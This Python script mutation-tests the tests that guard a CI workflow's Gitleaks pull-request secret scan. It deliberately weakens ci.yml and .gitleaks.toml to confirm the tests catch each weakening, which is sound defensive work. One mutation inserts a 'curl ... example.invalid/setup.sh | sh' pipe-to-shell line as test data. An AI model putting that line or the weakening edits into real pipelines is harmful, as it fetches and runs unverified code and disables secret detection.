#!/usr/bin/env python3
"""Negative control for the pull-request Gitleaks scan: prove the tests/test_gitleaks_pr_scan.py cases can FAIL.

Project: juniper-ml
Sub-Project: ad-hoc tooling
Author: Paul Calnon
Created: 2026-11-14
Status: ad-hoc — investigation (negative control for the port of juniper-data#530; ruling 10 in section 8 of notes/JUNIPER_2026-11-06_JUNIPER-ECOSYSTEM_CURSOR-FLOOD-4-DISPOSITION.md)
Retire when: the pull-request scan steps in ci.yml's Security Scan job are replaced or removed.
Related: .github/workflows/ci.yml (job `security`: "Install Gitleaks (pull request)", "Run Gitleaks over the pull request",
         "Upload Gitleaks Report", the two real-engine self-tests), tests/test_gitleaks_pr_scan.py, .gitleaks.toml; adapted
         from juniper-deploy's util/ad-hoc/2026-11-14_verify_gitleaks_pr_scan_tests_are_not_vacuous.py (juniper-deploy#277),
         itself juniper-data-client's (juniper-data-client#260). The reproduction of the action's window is not repeated
         here: juniper-data's util/ad-hoc/2026-11-08_reproduce_gitleaks_pr_commit_window.py and juniper-data-client's
         util/ad-hoc/2026-11-11_reproduce_gitleaks_pr_commit_window.py rebuild it.

WHY THIS EXISTS
---------------
A test that passes against both the fixed and the broken workflow pins nothing. Each mutation below undoes one
property by an exact-match edit, runs the tests that must go red and the tests that must stay green, each test in a
`python -m unittest` process of its own, then restores the file and proves the restore by SHA-256. Most mutations edit
ci.yml. Two edit this repository's `.gitleaks.toml`, which the hermetic repositories carry: one stops it extending the
built-in ruleset, one adds a global allowlist path that matches every file.

The scan step's shell is juniper-data's, so the first fourteen mutations are juniper-data's own
(util/ad-hoc/2026-11-08_verify_gitleaks_pr_scan_tests_are_not_vacuous.py there). The rest are the earlier ports',
adapted to this repository's `Security Scan` job: the engine version on the action step; the two real-engine
self-tests (this file's, and the ruleset's, whose binary a pull request now gets from the install step); the
regression step's line for this file (juniper-ml runs a hand-written list of suites, not a discovered directory); the
events the workflow runs on, `merge_group` included; and each remaining assertion of the static cases. Thirteen are on
what keeps a failure blocking: `continue-on-error` on the job, on the install or on the scan, a job-level `if`, the
job's name (a required check), the self-test's whole command, the whole digest line, the report upload (its
`if: always()`, its path, its place after the scan), and the anchor of the `git` filter's `sed` expression. Three more
are on this job's own report upload: its artifact's name, and its `if-no-files-found`. juniper-data-client's mutation
of its test file's `unit` mark is not here: unittest has no marks.

The real-engine cases need a gitleaks 8.24.3 binary: set GITLEAKS_BIN. GITLEAKS_PARITY_REQUIRED=1 is forced, so a
missing binary turns the baseline red instead of skipping (a skip would score as a pass). Every child process gets the
six Sentry DSN variables set to the empty string and a session bus address that does not exist; its scratch
repositories go under the temporary root the session gives (`tempfile`), which this script leaves as it is.

Run from the repo root, with an interpreter that has PyYAML (tests/test_gitleaks_pr_scan.py reads ci.yml with it)::

    GITLEAKS_BIN=<gitleaks 8.24.3> python3 util/ad-hoc/2026-11-14_verify_gitleaks_pr_scan_tests_are_not_vacuous.py --backup <dir> [--workers 4] [--json <file>]

It edits ci.yml in place, so run nothing else that reads the workflow while it runs, and pass --backup when the
tree is uncommitted: the script restores each file in a `finally`, which an interrupt (SIGINT) runs and a kill does
not. With --backup it keeps a pristine copy of every file it is about to mutate, and it refuses to start when a
copy left by an earlier run differs from the file, which is what a run killed mid-mutation leaves behind.

Exit 0 when the baseline is green, every mutation is caught by every test listed for it, no listed survivor goes
red, and every restore is exact; exit 1 otherwise.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import shutil
import subprocess  # nosec B404 - runs `python -m unittest` on fixed test ids
import sys
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
CI = ".github/workflows/ci.yml"
TEST_FILE = "tests/test_gitleaks_pr_scan.py"
CONFIG = ".gitleaks.toml"
T = "tests.test_gitleaks_pr_scan."
S = T + "StaticWiringTest."
R = T + "ScanStepRehearsalTest."
E = T + "RealEngineScanTest."
#: Seconds one unittest process may take; a real-engine case takes a few seconds, the slowest under heavy load about a minute.
RUN_TIMEOUT = 600
SENTRY_DSN_NAMES = ("SENTRY_SDK_DSN", "SENTRY_DSN", "JUNIPER_CASCOR_SENTRY_DSN", "JUNIPER_DATA_SENTRY_DSN", "CANOPY_SENTRY_DSN", "JUNIPER_CANOPY_SENTRY_DSN")

LANE = S + "test_the_regression_lane_runs_this_file"
ENGINE_PIN = S + "test_ci_pins_the_engine_and_requires_the_real_engine_runs"
ACTION_SKIPS_PR = S + "test_the_action_no_longer_scans_a_pull_request"
DIGEST = S + "test_a_pull_request_installs_the_same_engine_checked_by_digest"
EVENT_RANGE = S + "test_the_pull_request_scan_reads_its_range_from_the_event"
FETCH_DEPTH = S + "test_the_security_checkout_fetches_every_commit"
ARGV = R + "test_the_scan_step_hands_the_engine_the_whole_range"
NO_LEAKS = R + "test_the_scan_step_fails_the_way_the_action_does_no_leaks"
LEAKS = R + "test_the_scan_step_fails_the_way_the_action_does_leaks"
ENGINE_ERROR = R + "test_the_scan_step_fails_the_way_the_action_does_engine_error"
NOT_EXECUTABLE = R + "test_the_scan_step_fails_the_way_the_action_does_engine_not_executable"
REFUSE = [R + f"test_the_scan_step_refuses_a_range_it_cannot_resolve_{w}" for w in ("base_empty", "base_not_hex", "head_not_in_checkout")]
WARN = R + "test_the_scan_step_warns_when_the_range_and_the_pull_request_disagree"
OCTOPUS = R + "test_the_scan_step_refuses_an_octopus_merge"
NOTES = R + "test_the_scan_step_gives_the_engine_a_git_without_remerge_notes"
PAST_PAGE = E + "test_real_engine_scan_step_finds_a_token_past_the_actions_first_page"
MERGE = E + "test_real_engine_scan_step_finds_a_token_a_merge_brought_in"
MERGE_OWN = [E + f"test_real_engine_scan_step_finds_a_token_only_a_merge_commit_holds_{w}" for w in ("added_during_the_merge", "conflict_resolution")]
MERGE_KEEPS = [E + f"test_real_engine_scan_step_keeps_a_merge_findings_commit_and_path_{w}" for w in ("conflicted_path", "parent_subject")]
CLEAN = E + "test_real_engine_scan_step_passes_a_clean_range"
CLEAN_MERGE = E + "test_real_engine_scan_step_passes_a_clean_merge_of_the_base_branch"

RANGE = '          range="${BASE_SHA}..${HEAD_SHA}"'
LOG_OPTS = '"--log-opts=--remerge-diff ${range}"'
ON_PR = "        if: github.event_name == 'pull_request'\n"
ACTION_IF = "        if: github.event_name != 'pull_request'\n        uses: gitleaks/gitleaks-action@"
ACTION_NAME = "      - name: Run Gitleaks (Secrets Detection)\n"
SELF_TEST_RUN = '        run: |\n          python3 -m pip install "pyyaml>=6.0"\n          python3 -m unittest -v tests/test_gitleaks_pr_scan.py\n'
# The ruleset's self-test step carries the same env block, so the new step's is anchored by the command that follows it.
SELF_TEST = '        env:\n          GITLEAKS_PARITY_REQUIRED: "1"\n' + SELF_TEST_RUN
RULE_SELF_TEST = '        env:\n          GITLEAKS_PARITY_REQUIRED: "1"\n        run: python3 -m unittest -v -k RealEngine tests/test_gitleaks_secret_assignment_rule.py\n'
# This file's line in the regression step; the self-test runs the same command, so the comment line above anchors it.
LANE_LINE = "          # real-engine cases skip here (no binary) and run in the Security Scan job.\n          python3 -m unittest -v tests/test_gitleaks_pr_scan.py\n"
REGRESSION_STEP = "        id: run-python-regression-tests\n        continue-on-error: ${{ matrix.experimental == true }}\n"
REGRESSION_JOB = "  tests:\n    name: Regression Tests (Python ${{ matrix.python-version }})\n"
SHA_CHECK = '          echo "${GITLEAKS_SHA256}  ${RUNNER_TEMP}/${asset}" | sha256sum --check --strict\n'
UNPACK = '          mkdir -p "${dest}"\n          tar -xzf "${RUNNER_TEMP}/${asset}" -C "${dest}" gitleaks\n'
JOB_HEAD = "  security:\n    name: Security Scan\n    runs-on: ubuntu-latest\n"
UPLOAD_NAME = "      - name: Upload Gitleaks Report\n"
UPLOAD_WITH = "        with:\n          name: gitleaks-report\n          path: reports/security/\n          if-no-files-found: ignore\n"
PR_SCAN_NAME = "      - name: Run Gitleaks over the pull request (Secrets Detection)\n"
INSTALL_NAME = "      - name: Install Gitleaks (pull request)\n"
EVENTS_TAIL = "  merge_group:\n  workflow_dispatch:\n"


@dataclass
class Mutation:
    """One revert, plus the tests that must catch it and the tests it must leave green."""

    name: str
    edits: list[tuple[str, str]]  # (exact text in the file, replacement); each must match exactly once
    must_fail: list[str]
    must_still_pass: list[str] = field(default_factory=list)
    path: str = CI  # repo-relative


MUTATIONS = [
    # --- juniper-data's fourteen: the scan step's shell is the same ---
    Mutation("page cap: the range ends at the 30th commit", [(RANGE, '          range="${BASE_SHA}..$(git rev-list --reverse "${BASE_SHA}..${HEAD_SHA}" | head -n 30 | tail -n 1)"')], [PAST_PAGE, CLEAN], [MERGE, ARGV, *MERGE_OWN, CLEAN_MERGE]),
    Mutation("action's flags: --no-merges --first-parent back on the log options", [(LOG_OPTS, '"--log-opts=--no-merges --first-parent --remerge-diff ${range}"')], [EVENT_RANGE, MERGE, ARGV, *MERGE_OWN], [PAST_PAGE, CLEAN, CLEAN_MERGE]),
    Mutation("first-parent: --first-parent alone back on the log options", [(LOG_OPTS, '"--log-opts=--first-parent --remerge-diff ${range}"')], [EVENT_RANGE, MERGE, ARGV], [PAST_PAGE, CLEAN, CLEAN_MERGE, *MERGE_OWN]),
    Mutation("no remerge-diff: a merge commit's own changes go unscanned", [(LOG_OPTS, '"--log-opts=${range}"')], [ARGV, *MERGE_OWN], [EVENT_RANGE, MERGE, PAST_PAGE, CLEAN, CLEAN_MERGE]),
    Mutation("first-parent diff: a merge's first-parent patch in place of --remerge-diff", [(LOG_OPTS, '"--log-opts=--diff-merges=first-parent ${range}"')], [ARGV, CLEAN_MERGE, MERGE], [PAST_PAGE, CLEAN, *MERGE_OWN]),
    Mutation("off-by-one: base^..head", [(RANGE, '          range="${BASE_SHA}^..${HEAD_SHA}"')], [PAST_PAGE, CLEAN, ARGV], []),
    Mutation("leak passes: a leak passes the step", [('reports/security/gitleaks.sarif"\n              exit 1\n', 'reports/security/gitleaks.sarif"\n              exit 0\n')], [LEAKS, PAST_PAGE, MERGE], [ENGINE_ERROR, CLEAN]),
    Mutation("no SHA checks: the SHA checks removed", [('            if ! [[ "${sha}" =~ ^[0-9a-f]{40}$ ]] || ! git cat-file -e "${sha}^{commit}" 2>/dev/null; then\n', "            if false; then\n")], REFUSE, [ARGV, WARN]),
    Mutation("action on PRs: the action scans pull requests again", [(ACTION_IF, "        uses: gitleaks/gitleaks-action@")], [ACTION_SKIPS_PR], [EVENT_RANGE, ENGINE_PIN]),
    Mutation("no digest check: the tarball is unpacked without it", [(SHA_CHECK, "          true\n")], [DIGEST], [EVENT_RANGE]),
    Mutation("version drift: the pull-request install moves to another engine version", [('          GITLEAKS_VERSION: "8.24.3"\n          GITLEAKS_SHA256:', '          GITLEAKS_VERSION: "8.24.2"\n          GITLEAKS_SHA256:')], [DIGEST], [EVENT_RANGE, ENGINE_PIN]),
    Mutation("octopus passes: the octopus-merge refusal no longer stops the step", [('replace it with two-parent merges"\n            exit 1\n', 'replace it with two-parent merges"\n')], [OCTOPUS], [ARGV, MERGE, *MERGE_OWN, NOTES]),
    Mutation("no git filter: the engine reads git's remerge notes again", [('REAL_GIT="${real_git}" PATH="${filter}:${PATH}" gitleaks detect', "gitleaks detect")], [NOTES, *MERGE_KEEPS], [ARGV, OCTOPUS, *MERGE_OWN, CLEAN_MERGE]),
    Mutation("filter status: the filter exits with sed's status, not git's", [("          #!/usr/bin/env bash\n          set -o pipefail\n", "          #!/usr/bin/env bash\n")], [NOTES], [ARGV, OCTOPUS, *MERGE_KEEPS]),
    # --- the engine pin on the action step, and the two real-engine self-tests ---
    Mutation("action unpinned: GITLEAKS_VERSION leaves the action step", [('          GITLEAKS_VERSION: "8.24.3"\n        # The action declares no inputs', "        # The action declares no inputs")], [ENGINE_PIN], [DIGEST, ACTION_SKIPS_PR]),
    Mutation("action drift: the action step moves to another engine version", [('          GITLEAKS_VERSION: "8.24.3"\n        # The action declares no inputs', '          GITLEAKS_VERSION: "8.24.2"\n        # The action declares no inputs')], [ENGINE_PIN], [DIGEST]),
    Mutation("self-test optional: a missing binary skips again", [(SELF_TEST, SELF_TEST.replace('"1"', '"0"'))], [ENGINE_PIN], [EVENT_RANGE]),
    Mutation("self-test conditional: it runs on push only", [(SELF_TEST, "        if: github.event_name == 'push'\n" + SELF_TEST)], [ENGINE_PIN], [EVENT_RANGE]),
    Mutation("self-test tolerated: its failure no longer fails the job", [(SELF_TEST, "        continue-on-error: true\n" + SELF_TEST)], [ENGINE_PIN], [EVENT_RANGE]),
    Mutation("self-test gone: the step runs another file", [(SELF_TEST_RUN, '        run: |\n          python3 -m pip install "pyyaml>=6.0"\n          python3 -m unittest -v tests/test_ci_quality_gate.py\n')], [ENGINE_PIN, EVENT_RANGE], [DIGEST]),
    Mutation("self-test first: it runs before anything has installed the binary", [(ACTION_NAME, "      - name: Early self-test\n" + SELF_TEST + "\n" + ACTION_NAME)], [EVENT_RANGE], [ENGINE_PIN, DIGEST]),
    Mutation("rule self-test optional: its missing binary skips again", [(RULE_SELF_TEST, RULE_SELF_TEST.replace('"1"', '"0"'))], [ENGINE_PIN], [EVENT_RANGE]),
    Mutation("rule self-test conditional: it runs on push only", [(RULE_SELF_TEST, "        if: github.event_name == 'push'\n" + RULE_SELF_TEST)], [ENGINE_PIN], [EVENT_RANGE]),
    Mutation("rule self-test tolerated: its failure no longer fails the job", [(RULE_SELF_TEST, "        continue-on-error: true\n" + RULE_SELF_TEST)], [ENGINE_PIN], [EVENT_RANGE]),
    Mutation("rule self-test narrowed: its own shell drops a failure", [(RULE_SELF_TEST, RULE_SELF_TEST.replace("assignment_rule.py\n", "assignment_rule.py || true\n"))], [ENGINE_PIN], [EVENT_RANGE]),
    Mutation("rule self-test first: it runs before anything has installed the binary", [(ACTION_NAME, "      - name: Early rule self-test\n" + RULE_SELF_TEST + "\n" + ACTION_NAME)], [EVENT_RANGE], [ENGINE_PIN, DIGEST]),
    # --- the regression step's line for this file, the events the workflow runs on, and the checkout ---
    Mutation("regression lane drops the file", [(LANE_LINE, LANE_LINE.split("\n", 1)[0] + "\n")], [LANE], [ENGINE_PIN]),
    Mutation("regression lane comments it out", [(LANE_LINE, LANE_LINE.replace("\n          python3 -m", "\n          # python3 -m"))], [LANE], [ENGINE_PIN]),
    Mutation("regression lane narrowed: -k deselects the rehearsals", [(LANE_LINE, LANE_LINE.replace("unittest -v tests/", 'unittest -v -k "StaticWiring" tests/'))], [LANE], [ENGINE_PIN]),
    Mutation("regression lane tolerated: its failure no longer fails the step", [(LANE_LINE, LANE_LINE.replace("pr_scan.py\n", "pr_scan.py || true\n"))], [LANE], [ENGINE_PIN]),
    Mutation("regression step per-leg: it runs on one leg of the matrix only", [(REGRESSION_STEP, "        id: run-python-regression-tests\n        if: matrix.python-version == '3.13'\n        continue-on-error: ${{ matrix.experimental == true }}\n")], [LANE], [ENGINE_PIN]),
    Mutation("regression step tolerated: a failure passes on every leg", [(REGRESSION_STEP, "        id: run-python-regression-tests\n        continue-on-error: true\n")], [LANE], [ENGINE_PIN]),
    Mutation("regression job conditional: the whole job runs on push only", [(REGRESSION_JOB, REGRESSION_JOB + "    if: github.event_name == 'push'\n")], [LANE], [ENGINE_PIN]),
    Mutation("unsupported event: repository_dispatch joins the workflow's events", [(EVENTS_TAIL, "  merge_group:\n  repository_dispatch:\n  workflow_dispatch:\n")], [ACTION_SKIPS_PR], [EVENT_RANGE]),
    Mutation("events changed: merge_group leaves the workflow's events", [(EVENTS_TAIL, "  workflow_dispatch:\n")], [ACTION_SKIPS_PR], [EVENT_RANGE]),
    Mutation("no pull_request: the workflow stops running on pull requests", [("  pull_request:\n    branches:\n      - main\n      - develop\n  # merge_group:", "  # merge_group:")], [ACTION_SKIPS_PR], [EVENT_RANGE]),
    Mutation("shallow checkout: the Security Scan job fetches one commit", [("          # Gitleaks scans full git history, not just the tip commit.\n          fetch-depth: 0\n", "          # Gitleaks scans full git history, not just the tip commit.\n          fetch-depth: 1\n")], [FETCH_DEPTH], [EVENT_RANGE, ARGV]),
    # --- the install step's remaining pins ---
    Mutation("install unconditional: the install runs on every event", [(ON_PR + "        env:\n          GITLEAKS_VERSION:", "        env:\n          GITLEAKS_VERSION:")], [DIGEST], [EVENT_RANGE]),
    Mutation("digest drift: one digit of the pinned digest", [('GITLEAKS_SHA256: "9991e0b2', 'GITLEAKS_SHA256: "8991e0b2')], [DIGEST], [EVENT_RANGE]),
    Mutation("legacy URL: the tarball comes from the old repository name", [("https://github.com/gitleaks/gitleaks/releases/download/", "https://github.com/zricethezav/gitleaks/releases/download/")], [DIGEST], [EVENT_RANGE]),
    Mutation("check after unpack: the digest is checked once the tarball is unpacked", [(SHA_CHECK + UNPACK, UNPACK + SHA_CHECK)], [DIGEST], [EVENT_RANGE]),
    Mutation("not on PATH: the install no longer exports its directory", [('          echo "${dest}" >> "${GITHUB_PATH}"\n', "")], [DIGEST], [EVENT_RANGE]),
    Mutation("piped install: a download is piped into a shell", [('          "${dest}/gitleaks" version\n', '          "${dest}/gitleaks" version\n          curl -fsSL https://example.invalid/setup.sh | sh\n')], [DIGEST], [EVENT_RANGE]),
    # --- the scan step's remaining pins ---
    Mutation("scan unconditional: the scan runs on every event", [(ON_PR + "        env:\n          BASE_SHA:", "        env:\n          BASE_SHA:")], [EVENT_RANGE], [DIGEST, ARGV]),
    Mutation("scan names a shell: the rehearsals no longer run what GitHub runs", [(ON_PR + "        env:\n          BASE_SHA:", ON_PR + "        shell: sh\n        env:\n          BASE_SHA:")], [EVENT_RANGE], [DIGEST, ARGV]),
    Mutation("range from elsewhere: the head is the merge commit, not the pull request's head", [("          HEAD_SHA: ${{ github.event.pull_request.head.sha }}\n", "          HEAD_SHA: ${{ github.sha }}\n")], [EVENT_RANGE], [DIGEST, ARGV]),
    Mutation("silent count: the range's commit count is no longer logged", [('          echo "Scanning ${count} commit(s) in ${range}; the pull request reports ${PR_COMMITS}."\n', "")], [ARGV, PAST_PAGE, CLEAN], [WARN, MERGE]),
    Mutation("no warning: a count that differs from the pull request's passes in silence", [('            echo "::warning title=Gitleaks::${range} holds ${count} commit(s), and the pull request reports ${PR_COMMITS}"\n', "            true\n")], [WARN], [ARGV, OCTOPUS]),
    Mutation("no summary: the job summary loses the count and the exit code", [("printf '### Gitleaks\\n\\n%s commit(s) scanned in %s; gitleaks exited %s.\\n'", "printf ''")], [ARGV], [WARN, LEAKS]),
    Mutation("engine error passes: a gitleaks failure that is not a scan result passes", [('which is not a scan result"\n              exit "${rc}"\n', 'which is not a scan result"\n              exit 0\n')], [ENGINE_ERROR, NOT_EXECUTABLE], [LEAKS, NO_LEAKS]),
    Mutation("engine error flattened: every gitleaks failure exits 1", [('which is not a scan result"\n              exit "${rc}"\n', 'which is not a scan result"\n              exit 1\n')], [NOT_EXECUTABLE], [ENGINE_ERROR, LEAKS, NO_LEAKS]),
    Mutation("clean scan fails: exit 0 from gitleaks fails the step", [("            0) ;;\n", "            0) exit 1 ;;\n")], [NO_LEAKS, ARGV, CLEAN], [LEAKS, *REFUSE]),
    Mutation("unredacted: the scan drops --redact", [("gitleaks detect --redact -v", "gitleaks detect -v")], [ARGV, PAST_PAGE], [LEAKS, WARN]),
    # --- what keeps a failure blocking: the job, the two pull-request steps, the self-test's command, the report upload, the filter's anchor ---
    Mutation("job tolerated: a failed Security Scan job no longer fails the run", [(JOB_HEAD, JOB_HEAD + "    continue-on-error: true\n")], [ENGINE_PIN], [EVENT_RANGE, DIGEST]),
    Mutation("job conditional: the whole Security Scan job skips Dependabot's pull requests", [(JOB_HEAD, JOB_HEAD + "    if: github.actor != 'dependabot[bot]'\n")], [ENGINE_PIN], [EVENT_RANGE, DIGEST]),
    Mutation("job renamed: the required check's name is gone", [("    name: Security Scan\n", "    name: Secret Scan\n")], [ENGINE_PIN], [EVENT_RANGE, DIGEST]),
    Mutation("install tolerated: a failed install no longer fails the job", [(ON_PR + "        env:\n          GITLEAKS_VERSION:", ON_PR + "        continue-on-error: true\n        env:\n          GITLEAKS_VERSION:")], [DIGEST], [EVENT_RANGE]),
    Mutation("scan tolerated: a leak no longer fails the job", [(ON_PR + "        env:\n          BASE_SHA:", ON_PR + "        continue-on-error: true\n        env:\n          BASE_SHA:")], [EVENT_RANGE], [DIGEST, ARGV]),
    Mutation("self-test swallowed: its own shell drops a failure", [(SELF_TEST_RUN, SELF_TEST_RUN.replace("pr_scan.py\n", "pr_scan.py || true\n"))], [ENGINE_PIN], [EVENT_RANGE, DIGEST]),
    Mutation("self-test narrowed: -k deselects the real-engine cases", [(SELF_TEST_RUN, SELF_TEST_RUN.replace("unittest -v tests/", 'unittest -v -k "not RealEngine" tests/'))], [ENGINE_PIN], [EVENT_RANGE, DIGEST]),
    Mutation("digest check swallowed: a mismatch no longer stops the install", [(SHA_CHECK, SHA_CHECK.replace("--strict\n", "--strict || true\n"))], [DIGEST], [EVENT_RANGE]),
    Mutation("self-hash: the tarball is checked against its own digest, not the pinned one", [(SHA_CHECK, '          echo "$(sha256sum "${RUNNER_TEMP}/${asset}" | cut -d " " -f 1)  ${RUNNER_TEMP}/${asset}" | sha256sum --check --strict\n')], [DIGEST], [EVENT_RANGE]),
    Mutation("report lost: the upload no longer runs after a failed scan", [("        if: always()\n" + UPLOAD_WITH, UPLOAD_WITH)], [EVENT_RANGE], [DIGEST, ENGINE_PIN]),
    Mutation("report left out: the upload takes the action's file, which a pull request never writes", [(UPLOAD_WITH, UPLOAD_WITH.replace("path: reports/security/\n", "path: results.sarif\n"))], [EVENT_RANGE], [DIGEST, ENGINE_PIN]),
    Mutation(
        "report early: the upload runs before the scan has written its report",
        [(UPLOAD_NAME, "      - name: Upload Gitleaks Report (late)\n"), (PR_SCAN_NAME, UPLOAD_NAME + "        uses: actions/upload-artifact@v7\n        if: always()\n" + UPLOAD_WITH + "\n" + PR_SCAN_NAME)],
        [EVENT_RANGE],
        [DIGEST, ENGINE_PIN],
    ),
    Mutation("filter unanchored: every line that holds the word remerge is deleted, not only git's notes", [("sed -e '/^remerge /d'", "sed -e '/remerge/d'")], [NOTES], [ARGV, OCTOPUS, *MERGE_KEEPS]),
    # --- this job's own report upload: the artifact the docs name, and what a push (which writes no report here) sees ---
    Mutation("report renamed: the artifact takes the action's name again", [(UPLOAD_WITH, UPLOAD_WITH.replace("name: gitleaks-report\n", "name: gitleaks-results.sarif\n"))], [EVENT_RANGE], [DIGEST, ENGINE_PIN]),
    Mutation("report warns: if-no-files-found back to the default, which annotates every push", [(UPLOAD_WITH, UPLOAD_WITH.replace("          if-no-files-found: ignore\n", ""))], [EVENT_RANGE], [DIGEST, ENGINE_PIN]),
    Mutation("report fails push: if-no-files-found error fails the required check on every push", [(UPLOAD_WITH, UPLOAD_WITH.replace("if-no-files-found: ignore\n", "if-no-files-found: error\n"))], [EVENT_RANGE], [DIGEST, ENGINE_PIN]),
    # --- the install's place: the self-tests need the binary it puts on PATH ---
    Mutation("install late: the install runs after the scan that needs it", [(INSTALL_NAME, "      - name: Install Gitleaks (pull request) (early copy removed)\n"), (UPLOAD_NAME, INSTALL_NAME + "        if: github.event_name == 'pull_request'\n        run: true\n\n" + UPLOAD_NAME)], [EVENT_RANGE, DIGEST], [ENGINE_PIN]),
    # --- the repository's own ruleset, which the hermetic repositories carry: one that loads no rule, one that allows every path ---
    Mutation("config stops extending: .gitleaks.toml no longer loads the built-in rules", [("[extend]\nuseDefault = true\n", "[extend]\nuseDefault = false\n")], [PAST_PAGE, MERGE, *MERGE_OWN, *MERGE_KEEPS], [CLEAN, CLEAN_MERGE, ARGV], path=CONFIG),
    Mutation("config allows everything: a global allowlist path matches every file", [('  description = "Allowlisted patterns"\n', '  description = "Allowlisted patterns"\n  paths = [\'\'\'.*\'\'\']\n')], [PAST_PAGE, MERGE, *MERGE_OWN, *MERGE_KEEPS], [CLEAN, CLEAN_MERGE, ARGV], path=CONFIG),
]


def sha256(path: Path) -> str | None:
    return hashlib.sha256(path.read_bytes()).hexdigest() if path.is_file() else None


def child_env() -> dict[str, str]:
    env = dict(os.environ.items())
    env.update({name: "" for name in SENTRY_DSN_NAMES})
    env.update({"PYTHONDONTWRITEBYTECODE": "1", "GITLEAKS_PARITY_REQUIRED": "1", "DBUS_SESSION_BUS_ADDRESS": "unix:path=/nonexistent/no-session-bus"})
    env.pop("GITLEAKS_CONFIG", None)
    env.pop("GITLEAKS_CONFIG_TOML", None)
    return env


def run_one(test_id: str) -> bool:
    argv = [sys.executable, "-m", "unittest", "-q", test_id]
    try:
        return subprocess.run(argv, cwd=REPO, capture_output=True, text=True, env=child_env(), check=False, timeout=RUN_TIMEOUT).returncode == 0  # nosec B603
    except subprocess.TimeoutExpired:
        return False


def run_tests(test_ids: list[str], workers: int) -> dict[str, bool]:
    """Return {test_id: passed}; each id runs in a process of its own so one red cannot mask another."""
    with ThreadPoolExecutor(max_workers=workers) as pool:
        return dict(zip(test_ids, pool.map(run_one, test_ids)))


def keep_pristine_copies(backup: Path, paths: list[str]) -> None:
    """Copy every file about to be mutated to ``backup``, after checking the copies an earlier run left there.

    A copy that differs from its file means an earlier run was killed between a mutation and its restore, or the file
    was edited since: either way a person has to choose, so the run stops before it touches anything.
    """
    for path in paths:
        source, copy = REPO / path, backup / path
        if source.is_file() and copy.is_file() and source.read_bytes() != copy.read_bytes():
            raise SystemExit(f"FATAL: {path} differs from the pristine copy an earlier run left at {copy}.\n  If that run died mid-mutation, restore the file:  cp {copy} {source}\n  If you have edited {path} since, delete the copy and run again.")
    for path in paths:
        source, copy = REPO / path, backup / path
        if source.is_file():
            copy.parent.mkdir(parents=True, exist_ok=True)
            shutil.copyfile(source, copy)


def mutated_text(original: str, mutation: Mutation) -> str:
    text = original
    for find, replace in mutation.edits:
        count = text.count(find)
        if count != 1:
            raise SystemExit(f"FATAL: {mutation.name}: a pattern matched {count} times (expected 1) in {mutation.path}:\n  {find.strip()}")
        text = text.replace(find, replace)
    return text


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--backup", type=Path, help="keep a pristine copy of every file this run mutates here; a copy from an earlier run that differs from its file stops the run")
    ap.add_argument("--workers", type=int, default=4, help="unittest processes at a time (default and maximum: 4)")
    ap.add_argument("--json", type=Path, help="write every result to this file")
    ap.add_argument("--only", help="run only the mutations whose name contains this text")
    args = ap.parse_args()
    workers = max(1, min(args.workers, 4))
    if not os.environ.get("GITLEAKS_BIN"):
        print("GITLEAKS_BIN is unset: the real-engine cases cannot run, so the baseline would be red")
        return 1
    for stale in (REPO / "tests" / "__pycache__").glob(f"{Path(TEST_FILE).stem}*.pyc"):
        stale.unlink()
    mutations = [m for m in MUTATIONS if args.only is None or args.only in m.name]
    # Every mutation is checked against the unmutated files before any test runs, so a stale pattern stops the run here.
    originals: dict[str, str] = {}
    for mutation in mutations:
        target = REPO / mutation.path
        originals[mutation.path] = target.read_text(encoding="utf-8")
        mutated_text(originals[mutation.path], mutation)
    if args.backup:
        keep_pristine_copies(args.backup.resolve(), sorted(originals))
    before = {path: sha256(REPO / path) for path in originals}
    failures: list[str] = []
    record: dict = {"baseline": {}, "mutations": []}
    every = sorted({n for m in mutations for n in m.must_fail + m.must_still_pass})

    print("baseline (unmutated files): every listed test must PASS")
    for test_id, passed in run_tests(every, workers).items():
        print(f"  {'OK  ' if passed else 'RED '} {test_id.removeprefix(T)}")
        record["baseline"][test_id] = passed
        if not passed:
            failures.append(f"baseline: {test_id} is RED before any mutation")
    if failures:
        # A test that is red before any edit cannot show that an edit turned it red.
        print("FAIL: the baseline is red, so no mutation was run")
        for line in failures:
            print(f"  - {line}")
        return 1

    for mutation in mutations:
        print(f"\n{mutation.name}  [{mutation.path}]")
        target = REPO / mutation.path
        original = originals[mutation.path]
        try:
            target.write_text(mutated_text(original, mutation), encoding="utf-8")
            caught = run_tests(mutation.must_fail, workers)
            survived = run_tests(mutation.must_still_pass, workers)
        finally:
            target.write_text(original, encoding="utf-8")
        restored = sha256(target) == before[mutation.path]
        if not restored:
            failures.append(f"{mutation.name}: RESTORE FAILED -- {mutation.path} still holds the mutation")
        for test_id, passed in caught.items():
            print(f"  {'VACUOUS' if passed else 'CAUGHT '} {test_id.removeprefix(T)}")
            if passed:
                failures.append(f"{mutation.name}: {test_id} stayed GREEN -- it pins nothing here")
        for test_id, passed in survived.items():
            print(f"  {'OK     ' if passed else 'OVERBRD'} {test_id.removeprefix(T)} (expected unaffected)")
            if not passed:
                failures.append(f"{mutation.name}: {test_id} went red too -- the mutation is not the property it claims")
        record["mutations"].append({"name": mutation.name, "path": mutation.path, "killed_by": {n: not p for n, p in caught.items()}, "left_green": dict(survived), "restored_sha256": restored})

    pairs = sum(len(m["killed_by"]) for m in record["mutations"])
    killed = sum(sum(m["killed_by"].values()) for m in record["mutations"])
    kept = sum(sum(m["left_green"].values()) for m in record["mutations"])
    survivors = sum(len(m["left_green"]) for m in record["mutations"])
    record["totals"] = {"mutations": len(mutations), "mutation_test_pairs": pairs, "pairs_caught": killed, "survivors_listed": survivors, "survivors_green": kept, "failures": failures}
    record["sha256_after"] = {path: sha256(REPO / path) for path in originals}
    record["sha256_before"] = before
    if args.json:
        args.json.parent.mkdir(parents=True, exist_ok=True)
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(record, fh, indent=1)
            fh.write("\n")
    print(f"\n{len(mutations)} mutations: {killed} of {pairs} mutation-test pairs caught; {kept} of {survivors} listed survivors green.")
    if failures:
        print("FAIL")
        for line in failures:
            print(f"  - {line}")
        return 1
    print("PASS: every mutation is caught by every test listed for it, no listed survivor went red, and every file was restored exactly.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
